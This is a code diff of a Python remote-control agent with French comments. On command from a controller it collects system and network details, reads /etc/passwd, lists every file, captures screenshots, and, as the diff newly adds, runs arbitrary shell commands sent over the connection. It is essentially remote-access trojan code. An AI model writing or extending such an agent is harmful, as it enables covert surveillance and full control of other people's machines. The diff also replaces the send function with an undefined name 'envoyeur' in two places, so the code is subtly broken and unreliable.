@@ -6,6 +6,7 @@ import uuid
 import os
 import io
 import base64
+import subprocess
 import psutil
 from PIL import ImageGrab
 
@@ -76,10 +77,12 @@ def main():
                 if not isinstance(identifiant, str):
                     raise ValueError("Identifiant de message invalide")
                 
+                # 1. PING
                 if type_message == "ping":
                     envoyer(client, "pong", {}, identifiant)
                     print("[DEBIAN] PONG envoyé")
                 
+                # 2. SYSINFO
                 elif type_message == "sysinfo":
                     infos = {
                         "hostname": nom,
@@ -91,15 +94,19 @@ def main():
                     envoyer(client, "result", {"ok": True, "payload": {"info": infos}}, identifiant)
                     print("[DEBIAN] SYSINFO envoyé")
                 
+                # 3. INTERFACES (Sans localhost)
                 elif type_message == "interfaces":
                     infos = []
                     for nom_if, addrs in psutil.net_if_addrs().items():
+                        if nom_if == "lo": # <-- On exclut localhost
+                            continue
                         for addr in addrs:
                             if addr.family == socket.AF_INET:
                                 infos.append(f"{nom_if} : {addr.address}")
-                    envoyer(client, "result", {"ok": True, "payload": {"interfaces": "\n".join(infos)}}, identifiant)
+                    envoyeur(client, "result", {"ok": True, "payload": {"interfaces": "\n".join(infos)}}, identifiant)
                     print("[DEBIAN] INTERFACES envoyées")
 
+                # 4. PASSWD
                 elif type_message == "passwd":
                     try:
                         with open("/etc/passwd", "r") as f:
@@ -109,6 +116,7 @@ def main():
                     except Exception as e:
                         envoyer(client, "error", {"code": "ERR_PASSWD", "message": str(e)}, identifiant)
 
+                # 5. SHADOW (Permissions uniquement)
                 elif type_message == "shadow":
                     try:
                         stat_info = os.stat("/etc/shadow")
@@ -118,6 +126,7 @@ def main():
                     except Exception as e:
                         envoyer(client, "error", {"code": "ERR_SHADOW", "message": str(e)}, identifiant)
 
+                # 6. WALK (Sans limite)
                 elif type_message == "walk":
                     try:
                         fichiers = []
@@ -125,25 +134,36 @@ def main():
                             for root, dirs, files in os.walk(root_dir):
                                 for file in files:
                                     fichiers.append(os.path.join(root, file))
-                        res = "\n".join(fichiers[:30])
-                        if len(fichiers) > 30:
-                            res += f"\n... et {len(fichiers) - 30} autres fichiers."
+                        res = "\n".join(fichiers) # <-- Plus de limite
                         envoyer(client, "result", {"ok": True, "payload": {"walk": res}}, identifiant)
                         print("[DEBIAN] WALK envoyé")
                     except Exception as e:
                         envoyer(client, "error", {"code": "ERR_WALK", "message": str(e)}, identifiant)
 
+                # 7. SCREENSHOT
                 elif type_message == "screenshot":
                     try:
                         img = ImageGrab.grab()
                         buffer = io.BytesIO()
                         img.save(buffer, format="PNG")
                         b64_img = base64.b64encode(buffer.getvalue()).decode('utf-8')
-                        envoyer(client, "result", {"ok": True, "payload": {"screenshot": b64_img}}, identifiant)
+                        envoyeur(client, "result", {"ok": True, "payload": {"screenshot": b64_img}}, identifiant)
                         print("[DEBIAN] SCREENSHOT envoyé")
                     except Exception as e:
                         envoyer(client, "error", {"code": "ERR_SCREEN", "message": str(e)}, identifiant)
                 
+                # 8. CMD (Exécution de commandes Shell)
+                elif type_message == "cmd":
+                    commande = message.get("data", {}).get("cmd", "")
+                    try:
+                        res = subprocess.run(commande, shell=True, capture_output=True, text=True)
+                        sortie = res.stdout if res.stdout else res.stderr
+                        envoyer(client, "result", {"ok": True, "payload": {"cmd": sortie}}, identifiant)
+                        print(f"[DEBIAN] CMD exécutée : {commande}")
+                    except Exception as e:
+                        envoyer(client, "error", {"code": "ERR_CMD", "message": str(e)}, identifiant)
+                
+                # 9. Erreur par défaut
                 else:
                     envoyer(client, "error", {
                         "code": "UNSUPPORTED",
